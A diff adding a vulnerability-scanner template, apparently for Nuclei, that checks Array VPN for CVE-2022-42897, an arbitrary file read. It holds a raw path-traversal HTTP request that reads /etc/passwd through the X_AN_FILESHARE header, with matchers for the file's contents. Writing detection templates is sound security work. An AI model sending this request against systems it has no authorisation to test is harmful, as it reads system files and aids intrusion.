@@ -1,0 +1,23 @@
+id: cve-2022-42897-array-vpn-file-read
+info:
+  name: Array VPN任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,CVE-2022-42897
+http:
+  - raw:
+      - |
+        GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
+        Host: {{Hostname}}
+        X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 401
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+          - "No message available"
+        part: body
